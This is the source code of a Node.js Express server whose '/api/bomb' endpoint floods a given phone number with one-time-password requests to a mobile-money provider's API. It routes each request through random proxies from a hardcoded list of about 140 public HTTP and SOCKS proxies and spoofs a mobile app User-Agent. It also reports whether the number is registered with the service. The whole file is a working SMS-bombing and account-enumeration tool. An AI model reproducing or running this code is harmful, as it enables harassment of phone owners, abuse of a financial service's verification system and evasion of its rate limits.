const express = require('express');
const axios = require('axios');
const { HttpsProxyAgent } = require('https-proxy-agent');
const { SocksProxyAgent } = require('socks-proxy-agent');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// 100 PROXIES
const proxies = [
    "http://80.74.54.148:3128", "http://142.93.202.130:3128", "http://34.43.46.91:443",
    "http://103.178.160.149:3128", "http://103.158.210.21:8090", "http://165.154.162.73:8888",
    "http://8.213.151.128:3128", "http://190.167.38.11:999", "http://47.91.104.88:3128",
    "http://112.202.230.201:8082", "http://212.175.50.85:8085", "http://124.105.39.244:8081",
    "http://160.22.45.58:8080", "http://147.161.246.37:11333", "http://177.234.217.84:999",
    "http://5.230.201.190:3128", "http://119.93.120.93:8000", "http://190.12.150.244:999",
    "http://38.211.68.70:999", "http://209.14.113.2:999", "http://203.205.49.2:10015",
    "http://147.161.246.37:11033", "http://38.211.68.74:999", "http://41.33.89.100:1981",
    "http://103.166.158.41:1080", "http://177.234.217.46:999", "http://34.44.49.215:80",
    "http://201.4.65.79:8080", "http://125.25.167.199:80", "http://92.249.162.233:8080",
    "http://181.188.203.112:999", "http://147.161.246.37:10004", "http://64.76.33.108:999",
    "http://140.238.32.108:3128", "http://172.212.125.72:3128", "http://89.43.135.42:8080",
    "http://165.101.25.186:8080", "http://119.93.94.108:8080", "http://122.54.141.104:5050",
    "http://31.220.78.244:80", "http://103.17.215.9:8089", "http://4.144.146.21:80",
    "socks5://45.74.31.40:13320", "socks5://184.178.172.11:4145", "socks5://94.183.150.152:1080",
    "socks5://50.222.120.243:1080", "socks5://142.54.237.34:4145", "socks5://45.61.129.165:9050",
    "socks5://192.111.137.37:18762", "socks5://195.62.49.84:10808", "socks5://98.188.47.132:4145",
    "socks5://212.33.248.45:1080", "socks5://98.191.0.47:4145", "socks5://184.181.178.33:4145",
    "socks5://192.252.214.20:15864", "socks5://176.124.206.150:8443", "socks5://107.181.161.81:4145",
    "socks5://45.74.31.46:8309", "socks5://184.181.217.201:4145", "socks5://213.199.47.140:1080",
    "socks5://174.75.211.193:4145", "socks5://202.44.106.141:1080", "socks5://88.218.122.246:50051",
    "socks5://43.130.38.45:51029", "socks5://121.169.46.116:1090", "socks5://95.3.92.2:1080",
    "socks5://43.248.173.115:888", "socks5://46.232.249.209:40001", "socks5://66.94.112.133:1088",
    "socks5://94.233.120.194:1080", "socks5://95.83.154.186:1080", "socks5://5.255.103.55:1080",
    "socks5://5.75.133.113:10814", "socks5://192.252.211.193:4145", "socks5://142.54.235.9:4145",
    "socks5://195.9.192.50:1080", "socks5://184.182.240.211:4145", "socks5://8.219.122.8:9999",
    "socks5://68.71.251.134:4145", "socks5://199.102.105.242:4145", "socks5://104.200.135.46:4145",
    "socks5://171.25.158.95:1080", "socks5://38.172.125.42:1080", "socks5://45.74.31.41:9529",
    "socks5://45.74.31.42:5268", "socks5://45.74.31.47:4656", "socks5://45.74.31.47:10056",
    "socks5://98.188.47.150:4145", "socks5://174.77.111.196:4145", "socks5://192.111.139.165:4145",
    "socks5://184.181.217.206:4145", "socks5://199.102.106.94:4145", "socks5://192.252.208.70:14282",
    "socks5://98.170.57.231:4145", "socks5://174.75.211.222:4145", "socks5://199.58.184.97:4145",
    "socks5://98.182.147.97:4145", "socks5://216.105.130.131:4145", "socks5://68.71.242.118:4145",
    "socks5://72.194.42.156:4145", "socks5://184.178.172.17:4145", "socks5://68.71.254.6:4145",
    "socks5://98.188.47.150:4145", "socks5://192.111.137.35:4145", "socks5://192.252.209.158:4145",
    "socks4://176.195.204.221:1080", "socks4://42.115.72.145:1117", "socks4://192.252.208.67:14287",
    "socks4://70.166.167.55:57745", "socks4://66.42.224.229:41679", "socks4://42.115.72.145:1095",
    "socks4://103.158.13.191:100", "socks4://42.115.72.145:1087", "socks4://47.85.9.228:10800",
    "socks4://72.49.49.11:31034", "socks4://181.209.98.106:1080", "socks4://36.95.189.165:5678",
    "socks4://159.148.146.65:5678", "socks4://72.195.114.184:4145", "socks4://116.104.155.66:1095",
    "socks4://193.158.12.141:4153", "socks4://24.37.245.42:51056", "socks4://190.54.100.74:5678",
    "socks4://83.56.15.57:5678", "socks4://190.111.243.150:1085", "socks4://24.249.199.4:4145",
    "socks4://192.111.130.2:4145", "socks4://185.173.179.184:1080", "socks4://216.68.128.121:4145",
    "socks4://36.64.27.123:5678", "socks4://98.188.47.150:4145", "socks4://98.178.72.21:10919",
    "socks4://68.1.210.189:4145", "socks4://190.89.104.76:5432", "socks4://31.76.110.221:1080",
    "socks4://41.75.84.86:4153", "socks4://167.99.3.26:8447", "socks4://174.64.199.79:4145"
];

app.get('/api/bomb', async (req, res) => {
    const phone = req.query.phone;
    if (!phone) return res.status(400).json({ error: 'Phone number required' });

    const shuffled = [...proxies].sort(() => 0.5 - Math.random());
    const selectedProxies = shuffled.slice(0, 3);
    
    let completed = false;

    const attempts = selectedProxies.map(async (proxyUrl) => {
        if (completed) return;

        let agent;
        try {
            if (proxyUrl.startsWith('socks')) {
                agent = new SocksProxyAgent(proxyUrl);
            } else {
                agent = new HttpsProxyAgent(proxyUrl);
            }
        } catch (e) {
            return;
        }

        const targetUrl = `https://api.wavemoney.io:8100/v3/wmt-mfs-otp/generate-otp?msisdn=${phone}`;

        try {
            const response = await axios.get(targetUrl, {
                httpsAgent: agent,
                headers: {
                    "Accept": "application/json",
                    "User-Agent": "okhttp/4.9.3",
                    "Accept-Language": "my"
                },
                timeout: 3000, 
                validateStatus: () => true 
            });

            // 404 Not Registered ကို ဖမ်းမယ်
            if (!completed && response.status === 404) {
                completed = true;
                return res.status(404).json({ status: 'not_registered' });
            }

            // 200 ဒါမှမဟုတ် 500 ဆိုရင် အောင်မြင်တယ်
            if (!completed && (response.status === 200 || response.status === 500)) {
                completed = true;
                return res.json({ status: 'success' });
            }
        } catch (error) {
            // Error တက်ရင် ကျော်မယ်
        }
    });

    const result = await Promise.race([
        Promise.all(attempts),
        new Promise((resolve) => setTimeout(() => resolve({ status: 'timeout' }), 3500))
    ]);

    if (result && (result.status === 'success' || result.status === 'not_registered')) {
        return;
    }

    if (!res.headersSent) {
        return res.status(502).json({ status: 'failed' });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Nyth Backend running on port ${PORT}`);
});
